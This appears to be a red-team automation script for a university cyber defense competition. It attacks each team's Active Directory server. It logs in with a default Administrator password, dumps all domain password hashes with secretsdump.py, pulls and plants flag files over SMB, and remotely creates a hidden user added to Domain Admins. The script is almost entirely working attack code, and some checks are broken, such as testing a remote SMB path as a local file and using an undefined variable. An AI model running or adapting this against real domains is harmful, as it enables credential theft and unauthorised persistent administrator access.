#!/bin/bash

#AD Autopwn with Flag Planting

# Define the username and password
USERNAME="Administrator"
PASSWORD="cdc"

# File containing the AD server targets
TARGET_FILE="ad-targets.txt"

# Loop through each line in the target file
while IFS=',' read -r team_number target; do
  # Extract the team number and the IP:Port
  IP_PORT=$target
  
  # Construct the domain and host names
  DOMAIN="team$team_number.isucdc.com"
  HOST="ad.team$team_number.isucdc.com"
  
  # Output file named after the team number
  OUTPUT_FILE="/loot/team$team_number-ad-secretsdump.txt"
  
  # Print out the current operation for logging
  echo "Attempting to dump NTDS from $HOST at $IP_PORT, saving to $OUTPUT_FILE"
  
  # Run secretsdump.py to dump the domain NTDS and save output to a file
  secretsdump.py "$USERNAME:$PASSWORD@$IP_PORT" -just-dc -dc-ip "$IP_PORT" -target-domain "$DOMAIN" > "$OUTPUT_FILE" 2>&1
  
  # Check if the command was successful
  if [ $? -eq 0 ]; then
    echo "NTDS dump successful for $DOMAIN ($IP_PORT), saved to $OUTPUT_FILE"
  else
    echo "Failed to dump NTDS for $DOMAIN ($IP_PORT), check $OUTPUT_FILE for details"
  fi

  ################ Get Blue flag ####################
  
  SMB_SHARE="C$"  
  REMOTE_FILE="C$/Windows/System32/team${team_number}_ad-cwindowssystem32.flag"  
  LOCAL_FILE="loot/team${team_number}_cwindowssystem32.flag"
       

  # Download the file (downloads to the current directory)
  #TODO: Download file to LOCAL_FILE path
  smbmap -H $HOST -u $USERNAME -p $PASSWORD --download $REMOTE_FILE

  # Check if the download was successful
  if [ $? -eq 0 ]; then
      echo "File downloaded successfully"
  else
      echo "FAILED to download the file. It might not exist!"
      #Check the directories for renamed flags or other weird files with SMBMAP
      #Save output of possible flags to file for manual download
      BAD_BLUE_AD_FLAG="loot/team${team_number}_AD_missing-flag-search.txt"
      smbmap.py -H $HOST -u $USERNAME -p $PASSWORD -r 'c$/Windows/System32' --depth 1 -A '(flag|cdc)' > "$BAD_BLUE_AD_FLAG"
  fi
    
  ############### Plant Red Flag 1 (Admin User File) ##################

  RED_FLAG_LOCATION="C$/Users/Administrator/team${team_number}_ad-cusersadministrator.flag"
  LOCAL_RED_FLAG="flags/team${team_number}/team${team_number}_ad-cusersadministrator.flag"

  # Check if the flag file exists
    if [ ! -f "$RED_FLAG_LOCATION" ]; then
        echo "Flag file for team $TEAM_NUMBER not found at $RED_FLAG_LOCATION"
        continue
    fi

  smbmap -H $HOST -u $USERNAME -p $PASSWORD --upload $LOCAL_RED_FLAG $RED_FLAG_LOCATION

  # Check if the upload was successful
  if [ $? -eq 0 ]; then
      echo "Flag file uploaded successfully"
  else
      echo "FAILED to upload the flag"
  fi

  #TODO: Add checks to find the planted flag via SMB to verify that the flag was placed correctly.

  ######## Plant Red Flag 2 (Domain Admin User) ###################

  # NOTE: The flag needs to be truncated due to the max username size limit on Windows/AD. 12 chars is enough :)
  RED_DOMAIN_FLAG_USER=`head -c 12 flags/team${team_number}/team${team_number}_ad-domain-admin.flag`
  RED_DOMAIN_FLAG_PASSWD="tacocat"
  DOMAIN_USER_CMD="NET USER ${RED_DOMAIN_FLAG_USER} ${RED_DOMAIN_FLAG_PASSWD} /ADD /DOMAIN"
  DOMAIN_ADMIN_CMD="NET LOCALGROUP \"Domain Admins\" ${RED_DOMAIN_FLAG_USER} /ADD /DOMAIN"

  smbmap -u $USERNAME -p $PASSWORD -d $DOMAIN -H $HOST -x "$DOMAIN_USER_CMD"
  # Check if adding the user was successful
  if [ $? -eq 0 ]; then
      echo "Added user $RED_DOMAIN_FLAG_USER to domain with password $RED_DOMAIN_FLAG_PASSWD!"
      #TODO: Add Regex to double check that the user was added correctly.
      #TODO: Might also do another command check to 'search' for the user via SMB cmd or LDAP lookup to double check.
  else
      echo "FAILED to add domain user! (Is it a Domain Controller? Do you have a high-priv account?)"
      #TODO: Add some error checking and make sure the group exists or checking other issues.
  fi
  
  smbmap -u $USERNAME -p $PASSWORD -d $DOMAIN -H $HOST -x "$DOMAIN_ADMIN_CMD"
  # Check if adding the user was successful
  if [ $? -eq 0 ]; then
      echo "Added user $RED_DOMAIN_FLAG_USER to Domain Admin group!"
      #TODO: Auto claim flag in ISCORE via custom made API
  else
      echo "FAILED to add user to Domain Admin group! (Do you have a high-priv account? Did they rename or remove the group?)"
  fi
  
  
done < "$TARGET_FILE"
